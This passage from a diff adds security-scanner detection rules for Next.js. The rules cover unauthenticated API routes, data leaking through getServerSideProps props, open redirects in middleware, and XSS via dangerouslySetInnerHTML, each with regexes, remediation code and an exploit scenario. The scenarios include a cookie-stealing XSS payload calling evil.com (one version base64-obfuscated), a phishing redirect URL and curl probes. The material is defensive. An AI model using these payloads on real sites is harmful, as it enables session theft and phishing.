+    owasp: "A07:2021-Identification and Authentication Failures"
+    tags:
+      - nextjs
+      - api-route
+      - authentication
+      - authorization
+      - missing-auth
+      - server-side
+    detection_layer: 4
+    attack_surface_type: "api"
+    patterns:
+      - type: regex
+        pattern: 'export\s+default\s+function\s+handler\s*\(\s*req\s*,\s*res\s*\)'
+        description: "Default API route handler export without auth in function body"
+      - type: regex
+        pattern: 'export\s+default\s+async\s+function\s+handler\s*\(\s*req\s*,\s*res\s*\)'
+        description: "Async default API route handler without auth"
+      - type: regex
+        pattern: 'export\s+async\s+function\s+(GET|POST|PUT|DELETE|PATCH)\s*\('
+        description: "Next.js 13+ App Router route handler without auth"
+      - type: regex
+        pattern: 'export\s+function\s+(GET|POST|PUT|DELETE|PATCH)\s*\('
+        description: "App Router route handler export without auth"
+      - type: regex
+        pattern: 'module\.exports\s*=\s*(?:async\s+)?function\s*\(\s*req\s*,\s*res\s*\)'
+        description: "CommonJS API route export without auth"
+      - type: regex
+        pattern: 'export\s+default\s+\(\s*req\s*(?::\s*\w+)?\s*,\s*res\s*(?::\s*\w+)?\s*\)\s*=>'
+        description: "Arrow function API route without auth"
+      - type: regex
+        pattern: 'NextResponse\.json\s*\(\s*\{(?![\s\S]*unauthorized)[\s\S]*\}\s*\)'
+        description: "NextResponse returning data without prior auth validation"
+      - type: regex
+        pattern: 'export\s+default\s+async\s+\(\s*req\s*(?::\s*\w+)?\s*,\s*res\s*(?::\s*\w+)?\s*\)\s*=>'
+        description: "Async arrow function API route without auth"
+    anti_patterns:
+      - 'getSession\s*\(\s*\{?\s*req'
+      - 'getServerSession\s*\('
+      - 'getToken\s*\(\s*\{?\s*req'
+      - 'auth\s*\(\s*req'
+      - 'authenticate\s*\(\s*req'
+      - 'verifyToken\s*\('
+      - 'jwt\.verify\s*\('
+      - 'withAuth\s*\('
+      - 'requireAuth\s*\('
+      - 'isAuthenticated\s*\('
+      - 'session\s*\?\.\s*user'
+      - 'req\.headers\.authorization'
+      - 'cookies\s*\(\s*\)\.get\s*\(\s*["\x27]token["\x27]'
+      - 'NextAuth'
+      - 'clerk\.\w+'
+    bypass_variants:
+      - description: "Auth check present but missing on specific HTTP methods"
+        pattern: 'if\s*\(\s*req\.method\s*===\s*["\x27](GET|POST)["\x27]\s*\)\s*\{[\s\S]*\}(?![\s\S]*getSession)'
+      - description: "Auth middleware imported but not invoked in handler"
+        pattern: 'import\s+\{?\s*withAuth[\s\S]*export\s+default\s+(?:async\s+)?function\s+handler(?![\s\S]*withAuth)'
+      - description: "Auth check only in one branch of conditional"
+        pattern: 'if\s*\(\s*req\.method\s*===\s*["\x27]POST["\x27]\s*\)\s*\{[\s\S]*getSession[\s\S]*\}\s*else\s*\{[\s\S]*res\.(json|send)'
+    evasion_indicators:
+      - "Auth logic in separate middleware file not imported in route"
+      - "Auth configured at reverse proxy level not visible in application code"
+      - "Auth check wrapped in try-catch that silently succeeds on error"
+    encoding_variants:
+      - type: "dynamic_import"
+        pattern: 'const\s+\w+\s*=\s*await\s+import\s*\(\s*["\x27].*auth'
+      - type: "conditional_auth"
+        pattern: 'process\.env\.NODE_ENV\s*!==\s*["\x27]production["\x27]\s*\|\|\s*getSession'
+    multi_function_chain_patterns:
+      - "export handler -> req.body access -> database query -> res.json() [no auth]"
+      - "export GET -> prisma.find() -> NextResponse.json() [no auth]"
+      - "export POST -> req.json() -> database.insert() -> NextResponse.json() [no auth]"
+    privilege_context_flags:
+      requires_auth_context: true
+      admin_only_risk: true
+      escalation_vector: "Unauthenticated access to API routes enables full data access and modification"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "Unauthenticated HTTP request to /api/* route"
+        sink: "Database query or data mutation"
+        through: "Next.js API route handler"
+    impact: |
+      Unprotected Next.js API routes allow any unauthenticated user to access
+      server-side functionality. Attackers can read sensitive data, modify
+      records, delete resources, and invoke privileged operations. Since Next.js
+      API routes run server-side with full access to databases, environment
+      variables, and internal services, the impact can be catastrophic.
+    remediation: |
+      Add authentication checks to all API routes:
+
+      ```javascript
+      // Pages Router (pages/api/*)
+      import { getServerSession } from 'next-auth/next';
+      import { authOptions } from '../auth/[...nextauth]';
+
+      export default async function handler(req, res) {
+        const session = await getServerSession(req, res, authOptions);
+        if (!session) {
+          return res.status(401).json({ error: 'Unauthorized' });
+        }
+        // Handle authenticated request
+      }
+
+      // App Router (app/api/*)
+      import { getServerSession } from 'next-auth';
+      import { NextResponse } from 'next/server';
+
+      export async function GET(request) {
+        const session = await getServerSession();
+        if (!session) {
+          return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
+        }
+        // Handle authenticated request
+      }
+      ```
+    references:
+      - "https://nextjs.org/docs/pages/building-your-application/routing/api-routes"
+      - "https://next-auth.js.org/getting-started/example"
+      - "https://cwe.mitre.org/data/definitions/306.html"
+      - "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'pages/api/'
+        - 'app/api/'
+        - 'route\.(ts|js)'
+        - 'export\s+(default|async)'
+      taint_source_indicators:
+        - 'req\.body'
+        - 'req\.query'
+        - 'request\.json\s*\(\s*\)'
+        - 'request\.nextUrl\.searchParams'
+      taint_sink_indicators:
+        - 'res\.json\s*\('
+        - 'res\.send\s*\('
+        - 'NextResponse\.json\s*\('
+        - 'prisma\.\w+'
+      sanitization_patterns:
+        - 'getServerSession\s*\('
+        - 'getToken\s*\('
+        - 'verify\s*\('
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (data_mutation ? 1.5 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Next.js application has an API route at /api/users that returns all
+        user records from the database. The route handler directly queries
+        the database and returns results without checking if the request is
+        authenticated. An attacker discovers the endpoint and sends a GET
+        request to /api/users, receiving the full list of user records
+        including emails, hashed passwords, and personal information.
+      example_payload: "curl https://target.com/api/users"
+      attacker_objective: "Access sensitive data and operations through unprotected API routes"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "medium"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "FW-NEXT-002"
+        - "FW-NEXT-003"
+        - "FW-EXPRESS-001"
+
+  - rule_id: "FW-NEXT-002"
+    title: "getServerSideProps Data Exposure in Next.js"
+    description: >
+      Detects Next.js pages using getServerSideProps that pass excessive or
+      sensitive data to the client-side page component via props. Data returned
+      from getServerSideProps is serialized to JSON and embedded in the HTML
+      page source, making it visible to anyone who views the page source.
+      Developers often inadvertently expose database fields, internal IDs,
+      secrets, or user data from other accounts.
+    language: javascript
+    category: framework_misuse
+    severity: High
+    confidence: 0.84
+    cwe: CWE-200
+    owasp: "A01:2021-Broken Access Control"
+    tags:
+      - nextjs
+      - data-exposure
+      - server-side-rendering
+      - props-leak
+      - information-disclosure
+    requires:
+      framework:
+        - nextjs
+      file_paths:
+        - "*.js"
+        - "*.jsx"
+        - "*.ts"
+        - "*.tsx"
+        - "pages/*"
+        - "pages/**/*"
+        - "src/pages/*"
+        - "src/pages/**/*"
+      required_content:
+        - "getserversideprops"
+      exclude_educational: true
+    detection_layer: 4
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'return\s*\{\s*props\s*:\s*\{\s*\w+\s*:\s*\w+\s*\}\s*\}'
+        description: "Direct pass-through of server objects to props"
+      - type: regex
+        pattern: 'return\s*\{\s*props\s*:\s*\{\s*data\s*:\s*await\s+\w+\.find'
+        description: "Database query result passed directly to props"
+      - type: regex
+        pattern: 'return\s*\{\s*props\s*:\s*\{\s*user\s*:\s*user\s*\}'
+        description: "Full user object passed to props without filtering"
+      - type: regex
+        pattern: 'return\s*\{\s*props\s*:\s*\{\s*\.\.\.(?:data|result|record)'
+        description: "Spread operator passing all fields to props"
+      - type: regex
+        pattern: 'return\s*\{\s*props\s*:\s*JSON\.parse\s*\(\s*JSON\.stringify\s*\(\s*\w+'
+        description: "Full object serialization to props"
+      - type: regex
+        pattern: 'getServerSideProps[\s\S]*?password|secret|token|apiKey|creditCard'
+        description: "Sensitive field names in getServerSideProps return"
+      - type: regex
+        pattern: 'props\s*:\s*\{\s*\w+\s*\}(?![\s\S]*select\s*:)'
+        description: "Props returned without database field selection"
+      - type: regex
+        pattern: 'prisma\.\w+\.findUnique\s*\(\s*\{[\s\S]*?\}\s*\)[\s\S]*?props\s*:'
+        description: "Prisma query without select passed to props"
+    anti_patterns:
+      - 'select\s*:\s*\{'
+      - 'omit\s*\(\s*\w+\s*,\s*\[\s*["\x27]password["\x27]'
+      - 'delete\s+\w+\.password'
+      - 'delete\s+\w+\.secret'
+      - 'const\s*\{[^}]*password\s*,\s*\.\.\.rest\s*\}'
+      - '\.projection\s*\(\s*\{[^}]*password\s*:\s*0'
+      - '\.select\s*\(\s*["\x27]-password'
+      - 'sanitize\w*\s*\('
+      - 'filterSensitive\s*\('
+      - 'pick\s*\(\s*\w+\s*,\s*\['
+      - 'props\s*:\s*\{\s*\w+\s*:\s*\{\s*id\s*:\s*\w+\.id'
+      - 'toPublicJSON\s*\('
+      - 'serialize\s*\('
+      - 'JSON\.parse\s*\(\s*JSON\.stringify\s*\(\s*\{[\s\S]*?\}\s*\)\s*\)'
+      - 'superjson'
+    bypass_variants:
+      - description: "Sensitive data in nested object not filtered at top level"
+        pattern: 'props\s*:\s*\{\s*\w+\s*:\s*\{\s*\.\.\.\w+\s*,\s*\w+\s*:\s*\{[^}]*\}\s*\}'
+      - description: "Data filtered but includes relational data with sensitive fields"
+        pattern: 'include\s*:\s*\{\s*\w+\s*:\s*true\s*\}[\s\S]*?props\s*:'
+      - description: "Filtered in development but not in production build"
+        pattern: 'process\.env\.NODE_ENV\s*===\s*["\x27]development["\x27]\s*\?\s*\w+\s*:\s*\{[^}]*\}'
+    evasion_indicators:
+      - "Data passed through intermediate function that does not filter"
+      - "Multiple spread operators making it difficult to track which fields are included"
+      - "Data transformation in a separate utility file"
+    encoding_variants:
+      - type: "base64_props"
+        pattern: 'props\s*:\s*\{\s*data\s*:\s*Buffer\.from\s*\('
+      - type: "serialized_blob"
+        pattern: 'props\s*:\s*\{\s*data\s*:\s*JSON\.stringify\s*\(\s*\w+\s*\)'
+    multi_function_chain_patterns:
+      - "getServerSideProps -> db.findOne() -> return { props: { user } } -> page source exposure"
+      - "getServerSideProps -> fetch(internal_api) -> return { props: { ...data } } -> client exposure"
+      - "getServerSideProps -> prisma.user.findUnique({ include: { orders: true } }) -> full data leak"
+    privilege_context_flags:
+      requires_auth_context: true
+      admin_only_risk: false
+      escalation_vector: "Users can view other users or sensitive data leaked through page props"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "Database query in getServerSideProps"
+        sink: "__NEXT_DATA__ JSON embedded in HTML page"
+        through: "Props serialization"
+    impact: |
+      Data returned from getServerSideProps is serialized and embedded in the
+      HTML page within the __NEXT_DATA__ script tag. Any data included in props
+      is visible to the end user by viewing page source. This can leak database
+      passwords, API keys, internal user data, and fields from other users'
+      records. This data exposure violates data privacy regulations and may
+      enable further attacks.
+    remediation: |
+      Filter server-side data before passing to props:
+
+      ```javascript
+      export async function getServerSideProps(context) {
+        const user = await prisma.user.findUnique({
+          where: { id: context.params.id },
+          select: {
+            id: true,
+            name: true,
+            email: true,
+            avatar: true,
+            // Explicitly exclude: password, apiKey, internalNotes
+          },
+        });
+
+        if (!user) {
+          return { notFound: true };
+        }
+
+        return {
+          props: {
+            user: {
+              id: user.id,
+              name: user.name,
+              avatar: user.avatar,
+            },
+          },
+        };
+      }
+      ```
+    references:
+      - "https://nextjs.org/docs/pages/building-your-application/data-fetching/get-server-side-props"
+      - "https://cwe.mitre.org/data/definitions/200.html"
+      - "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'export\s+async\s+function\s+getServerSideProps'
+        - 'return\s*\{\s*props\s*:'
+        - '__NEXT_DATA__'
+        - 'GetServerSideProps'
+      taint_source_indicators:
+        - 'prisma\.\w+\.find'
+        - 'db\.query\s*\('
+        - 'mongoose\.\w+\.find'
+        - 'fetch\s*\(\s*["\x27]http'
+      taint_sink_indicators:
+        - 'return\s*\{\s*props\s*:'
+        - 'return\s*\{\s*props\s*:\s*\{'
+      sanitization_patterns:
+        - 'select\s*:\s*\{'
+        - 'delete\s+\w+\.\w+'
+        - 'pick\s*\('
+        - 'omit\s*\('
+    severity_scoring:
+      severity_weight: 8
+      risk_score_formula_hint: "severity_weight * confidence * (contains_pii ? 1.5 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Next.js page fetches user profile data in getServerSideProps and
+        passes the entire user object as props. The user object includes the
+        password hash, API key, and internal admin notes. An attacker visits
+        the page and views the source code, finding the __NEXT_DATA__ JSON
+        blob containing all of these sensitive fields. The attacker uses the
+        leaked API key to access internal services.
+      example_payload: "curl https://target.com/profile/123 | grep '__NEXT_DATA__' | python -m json.tool"
+      attacker_objective: "Extract sensitive server-side data from page source via __NEXT_DATA__ JSON"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "medium"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "FW-NEXT-001"
+        - "FW-NEXT-004"
+
+  - rule_id: "FW-NEXT-003"
+    title: "Unsafe Redirect in Next.js Middleware"
+    description: >
+      Detects Next.js middleware that performs redirects based on user-controlled
+      input without proper validation. Attackers can manipulate query parameters,
+      headers, or cookies to redirect users to malicious external sites, enabling
+      phishing, credential theft, and OAuth token interception. Open redirects in
+      middleware affect all routes matched by the middleware matcher.
+    language: javascript
+    category: framework_misuse
+    severity: High
+    confidence: 0.86
+    cwe: CWE-601
+    owasp: "A01:2021-Broken Access Control"
+    tags:
+      - nextjs
+      - middleware
+      - open-redirect
+      - phishing
+      - redirect-validation
+    detection_layer: 4
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'NextResponse\.redirect\s*\(\s*new\s+URL\s*\(\s*req\.\w+'
+        description: "Next.js redirect using user-controlled request data"
+      - type: regex
+        pattern: 'NextResponse\.redirect\s*\(\s*new\s+URL\s*\(\s*request\.nextUrl\.searchParams\.get'
+        description: "Redirect using URL search parameter"
+      - type: regex
+        pattern: 'NextResponse\.redirect\s*\(\s*\w+\s*\)[\s\S]*?req\.url'
+        description: "Redirect with URL derived from request"
+      - type: regex
+        pattern: 'redirect\s*\(\s*request\.nextUrl\.searchParams\.get\s*\(\s*["\x27](redirect|url|next|return|goto|to|dest|destination|callback)["\x27]\s*\)'
+        description: "Redirect using common redirect parameter names"
+      - type: regex
+        pattern: 'NextResponse\.redirect\s*\(\s*`[^`]*\$\{[^}]*req'
+        description: "Template literal redirect with request interpolation"
+      - type: regex
+        pattern: 'NextResponse\.redirect\s*\(\s*new\s+URL\s*\(\s*`[^`]*\$\{[^}]*searchParams'
+        description: "Template URL redirect from search params"
+      - type: regex
+        pattern: 'NextResponse\.redirect\s*\(\s*req\.headers\.get\s*\(\s*["\x27]referer["\x27]'
+        description: "Redirect based on referer header"
+      - type: regex
+        pattern: 'NextResponse\.redirect\s*\(\s*cookies\s*\(\s*\)\.get\s*\([^)]+\)\.value'
+        description: "Redirect based on cookie value"
+    anti_patterns:
+      - 'new\s+URL\s*\(\s*\w+\s*,\s*req\.nextUrl\.origin\s*\)'
+      - 'url\.hostname\s*===\s*["\x27]'
+      - 'url\.origin\s*===\s*["\x27]'
+      - 'allowedRedirects\s*\.\s*includes\s*\('
+      - 'safeRedirect\s*\('
+      - 'isInternalUrl\s*\('
+      - 'url\.startsWith\s*\(\s*["\x27]\/(?!\/)'
+      - 'isSafeRedirect\s*\('
+      - 'validateRedirectUrl\s*\('
+      - 'redirectAllowlist'
+      - 'url\.host\s*===\s*request\.nextUrl\.host'
+      - 'new\s+URL\s*\(\s*["\x27]\/\w+'
+      - 'pathname\.startsWith\s*\(\s*["\x27]\/\w+'
+      - 'redirect_whitelist'
+      - 'ALLOWED_REDIRECT_HOSTS'
+    bypass_variants:
+      - description: "URL validation bypassed with protocol-relative URL"
+        pattern: 'startsWith\s*\(\s*["\x27]\/["\x27]\s*\)(?![\s\S]*startsWith\s*\(\s*["\x27]\/\/["\x27])'
+      - description: "Host validation bypassed with subdomain manipulation"
+        pattern: '\.endsWith\s*\(\s*["\x27]\.example\.com["\x27]\s*\)'
+      - description: "URL parser confusion using backslash"
+        pattern: 'new\s+URL\s*\(\s*\w+\s*\)[\s\S]*?(?!.*protocol\s*===)'
+    evasion_indicators:
+      - "Using URL encoding to bypass redirect validation"
+      - "Using protocol-relative URLs (//evil.com) to bypass path-only checks"
+      - "Using backslash (\\/evil.com) to exploit URL parser inconsistencies"
+    encoding_variants:
+      - type: "url_encoded"
+        pattern: '%2f%2f\w+\.com'
+      - type: "unicode"
+        pattern: '\\u002f\\u002f'
+    multi_function_chain_patterns:
+      - "middleware -> searchParams.get('redirect') -> NextResponse.redirect(url) -> open redirect"
+      - "middleware -> cookie.get('return_url') -> NextResponse.redirect(url) -> phishing"
+      - "middleware -> headers.get('referer') -> NextResponse.redirect(url) -> session theft"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "Open redirect enables phishing and OAuth token theft via redirect_uri manipulation"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "URL search parameters (redirect, url, next)"
+        sink: "NextResponse.redirect()"
+        through: "Middleware URL construction"
+    impact: |
+      Open redirect vulnerabilities in Next.js middleware affect all routes
+      covered by the middleware matcher. Attackers can construct URLs that
+      appear to point to the legitimate application but redirect to malicious
+      sites. This enables convincing phishing attacks, OAuth token theft via
+      redirect_uri manipulation, and bypass of security controls that trust
+      the application domain.
+    remediation: |
+      Validate redirect URLs in middleware:
+
+      ```javascript
+      import { NextResponse } from 'next/server';
+
+      const ALLOWED_HOSTS = ['example.com', 'app.example.com'];
+
+      export function middleware(request) {
+        const redirectUrl = request.nextUrl.searchParams.get('redirect');
+
+        if (redirectUrl) {
+          try {
+            const url = new URL(redirectUrl, request.nextUrl.origin);
+            // Only allow same-origin or whitelisted redirects
+            if (!ALLOWED_HOSTS.includes(url.hostname)) {
+              return NextResponse.redirect(new URL('/', request.url));
+            }
+            // Prevent protocol-relative URL bypass
+            if (redirectUrl.startsWith('//')) {
+              return NextResponse.redirect(new URL('/', request.url));
+            }
+            return NextResponse.redirect(url);
+          } catch {
+            return NextResponse.redirect(new URL('/', request.url));
+          }
+        }
+      }
+      ```
+    references:
+      - "https://nextjs.org/docs/app/building-your-application/routing/middleware"
+      - "https://cwe.mitre.org/data/definitions/601.html"
+      - "https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"
+      - "https://portswigger.net/kb/issues/00500100_open-redirection-reflected"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'middleware\.ts'
+        - 'middleware\.js'
+        - 'NextResponse\.redirect'
+        - 'export\s+function\s+middleware'
+      taint_source_indicators:
+        - 'request\.nextUrl\.searchParams'
+        - 'req\.headers\.get\s*\('
+        - 'req\.cookies\.get\s*\('
+        - 'req\.url'
+      taint_sink_indicators:
+        - 'NextResponse\.redirect\s*\('
+        - 'new\s+URL\s*\('
+      sanitization_patterns:
+        - 'url\.hostname\s*===\s*["\x27]'
+        - 'ALLOWED_HOSTS\.includes\s*\('
+        - 'isInternalUrl\s*\('
+    severity_scoring:
+      severity_weight: 7
+      risk_score_formula_hint: "severity_weight * confidence * (auth_flow ? 1.5 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Next.js middleware reads a 'redirect' parameter and uses it to
+        redirect after authentication. An attacker crafts a URL:
+        https://app.example.com/login?redirect=https://evil.com/steal-creds
+        The victim clicks the link, logs in legitimately, and is redirected
+        to the attacker's site which mimics the real application and prompts
+        for additional information or captures the session.
+      example_payload: "https://target.com/login?redirect=https%3A%2F%2Fevil.com%2Fphish"
+      attacker_objective: "Redirect authenticated users to attacker-controlled phishing site"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "FW-NEXT-001"
+        - "FW-NEXT-002"
+        - "FW-NEXT-004"
+
+  - rule_id: "FW-NEXT-004"
+    title: "SSR Injection via dangerouslySetInnerHTML in Next.js"
+    description: >
+      Detects Next.js components that use dangerouslySetInnerHTML with data
+      sourced from user input, database queries, or external APIs without
+      proper sanitization. In a server-side rendering context, this can lead
+      to stored XSS, reflected XSS, and in some cases server-side template
+      injection. Because Next.js renders on the server first, injected scripts
+      are included in the initial HTML response.
+    language: javascript
+    category: framework_misuse
+    severity: High
+    confidence: 0.92
+    cwe: CWE-79
+    owasp: "A03:2021-Injection"
+    tags:
+      - nextjs
+      - xss
+      - ssr
+      - dangerouslySetInnerHTML
+      - injection
+      - react
+    detection_layer: 4
+    attack_surface_type: "web"
+    patterns:
+      - type: regex
+        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*\w+\s*\}'
+        description: "dangerouslySetInnerHTML with variable content"
+      - type: regex
+        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*props\.\w+'
+        description: "dangerouslySetInnerHTML with prop data"
+      - type: regex
+        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*`[^`]*\$\{'
+        description: "dangerouslySetInnerHTML with template literal interpolation"
+      - type: regex
+        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*data\??\.\w+'
+        description: "dangerouslySetInnerHTML with fetched data"
+      - type: regex
+        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*\w+\s*\+\s*'
+        description: "dangerouslySetInnerHTML with string concatenation"
+      - type: regex
+        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*params\.\w+'
+        description: "dangerouslySetInnerHTML with route params"
+      - type: regex
+        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*searchParams\.\w+'
+        description: "dangerouslySetInnerHTML with search params"
+      - type: regex
+        pattern: 'dangerouslySetInnerHTML\s*=\s*\{\s*createMarkup\s*\(\s*\w+'
+        description: "dangerouslySetInnerHTML via createMarkup helper with dynamic data"
+    anti_patterns:
+      - 'DOMPurify\.sanitize\s*\('
+      - 'sanitizeHtml\s*\('
+      - 'xss\s*\('
+      - 'sanitize\s*\(\s*\w+\s*\)'
+      - 'purify\.sanitize\s*\('
+      - 'isomorphic-dompurify'
+      - 'he\.encode\s*\('
+      - 'escape\s*\(\s*\w+\s*\)'
+      - 'escapeHtml\s*\('
+      - 'dangerouslySetInnerHTML\s*=\s*\{\s*\{\s*__html\s*:\s*["\x27]<[^"]+>["\x27]'
+      - 'sanitizer\.sanitize\s*\('
+      - 'bleach\.clean\s*\('
+      - 'marked\s*\(\s*\w+\s*,\s*\{\s*sanitize\s*:\s*true'
+      - 'rehype-sanitize'
+      - 'xss-filters'
+    bypass_variants:
+      - description: "Sanitization of parent field but not nested field"
+        pattern: 'sanitize\s*\(\s*\w+\.\w+\s*\)[\s\S]*dangerouslySetInnerHTML[\s\S]*__html\s*:\s*\w+\.\w+\.\w+'
+      - description: "Custom sanitizer that does not handle all XSS vectors"
+        pattern: 'replace\s*\(\s*/<script>/gi\s*,\s*["\x27]["\x27]\s*\)[\s\S]*dangerouslySetInnerHTML'
+      - description: "Server component rendering unsanitized markdown to HTML"
+        pattern: 'marked\s*\(\s*\w+\s*\)[\s\S]*dangerouslySetInnerHTML[\s\S]*__html'
+    evasion_indicators:
+      - "Using base64 encoded HTML in dangerouslySetInnerHTML"
+      - "Multi-step data flow from API response to dangerouslySetInnerHTML"
+      - "Server component fetching external content and rendering without sanitization"
+    encoding_variants:
+      - type: "base64_html"
+        pattern: 'atob\s*\(\s*\w+\s*\)[\s\S]*dangerouslySetInnerHTML'
+      - type: "unicode_escape"
+        pattern: 'unescape\s*\(\s*\w+\s*\)[\s\S]*dangerouslySetInnerHTML'
+    multi_function_chain_patterns:
+      - "fetch(api) -> response.json() -> data.content -> dangerouslySetInnerHTML [no sanitize]"
+      - "getServerSideProps -> db.query() -> props.htmlContent -> dangerouslySetInnerHTML [no sanitize]"
+      - "useSearchParams() -> param.get('content') -> dangerouslySetInnerHTML [no sanitize]"
+    privilege_context_flags:
+      requires_auth_context: false
+      admin_only_risk: false
+      escalation_vector: "XSS enables session hijacking, data theft, and full account takeover"
+    business_logic_indicator:
+      financial_impact: true
+      data_exposure_risk: true
+      compliance_relevant: true
+    probable_taint_paths:
+      - source: "User input (search params, form data, URL fragments)"
+        sink: "dangerouslySetInnerHTML __html property"
+        through: "Props, state, or fetched data"
+      - source: "Database content (user-generated HTML)"
+        sink: "dangerouslySetInnerHTML __html property"
+        through: "getServerSideProps or Server Component data fetching"
+    impact: |
+      Using dangerouslySetInnerHTML with unsanitized data in Next.js enables
+      cross-site scripting (XSS) attacks. Since Next.js performs server-side
+      rendering, the malicious script is embedded in the initial HTML response,
+      making it effective even against users with JavaScript-heavy client-side
+      protections. Attackers can steal session cookies, redirect users,
+      modify page content, and perform actions on behalf of the victim.
+    remediation: |
+      Always sanitize HTML before using dangerouslySetInnerHTML:
+
+      ```javascript
+      import DOMPurify from 'isomorphic-dompurify';
+
+      function SafeHtmlContent({ htmlContent }) {
+        const sanitizedHtml = DOMPurify.sanitize(htmlContent, {
+          ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'li'],
+          ALLOWED_ATTR: ['href', 'target', 'rel'],
+        });
+
+        return (
+          <div dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />
+        );
+      }
+
+      // Or better yet, use a safe Markdown renderer:
+      import ReactMarkdown from 'react-markdown';
+      import rehypeSanitize from 'rehype-sanitize';
+
+      function SafeContent({ content }) {
+        return <ReactMarkdown rehypePlugins={[rehypeSanitize]}>{content}</ReactMarkdown>;
+      }
+      ```
+    references:
+      - "https://react.dev/reference/react-dom/components/common#dangerously-setting-the-inner-html"
+      - "https://cwe.mitre.org/data/definitions/79.html"
+      - "https://owasp.org/Top10/A03_2021-Injection/"
+      - "https://github.com/cure53/DOMPurify"
+    context_awareness:
+      surrounding_context_patterns:
+        - 'dangerouslySetInnerHTML'
+        - '__html\s*:'
+        - 'createMarkup\s*\('
+        - 'innerHTML'
+      taint_source_indicators:
+        - 'props\.\w+'
+        - 'searchParams'
+        - 'params\.\w+'
+        - 'data\.\w+'
+        - 'fetch\s*\('
+      taint_sink_indicators:
+        - '__html\s*:\s*\w+'
+        - 'dangerouslySetInnerHTML'
+      sanitization_patterns:
+        - 'DOMPurify\.sanitize\s*\('
+        - 'sanitizeHtml\s*\('
+        - 'xss\s*\('
+    severity_scoring:
+      severity_weight: 9
+      risk_score_formula_hint: "severity_weight * confidence * (ssr_context ? 1.5 : 1.0)"
+      exploitability_score: "High"
+    exploit_scenario:
+      attack_example: |
+        A Next.js blog application renders user-submitted article content
+        using dangerouslySetInnerHTML without sanitization. An attacker
+        creates an article containing:
+        <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
+        When any user views the article, the malicious script executes,
+        sending their session cookie to the attacker. Since Next.js SSR
+        embeds this in the initial HTML, it executes before any client-side
+        protection can intervene.
+      example_payload: '<img src=x onerror="fetch(atob(aHR0cHM6Ly9ldmlsLmNvbS9zdGVhbA==)+\"?c=\"+document.cookie)">'
+      attacker_objective: "Execute arbitrary JavaScript in victims' browsers to steal sessions and data"
+    confidence_factors:
+      pattern_strength: "high"
+      context_match: "high"
+      proximity_to_user_input: "high"
+      sanitization_absence: "high"
+    metadata:
+      rule_version: "3.0.0"
+      last_reviewed: "2025-01-15"
+      rule_maturity_level: "hardened"
+      detection_complexity: "framework-aware"
+    cross_rule_intelligence:
+      cross_file_risk_flag: true
+      requires_ai_validation: true
+      high_impact_flag: true
+      related_rules:
+        - "FW-NEXT-001"
+        - "FW-NEXT-002"
+        - "FW-NEXT-003"
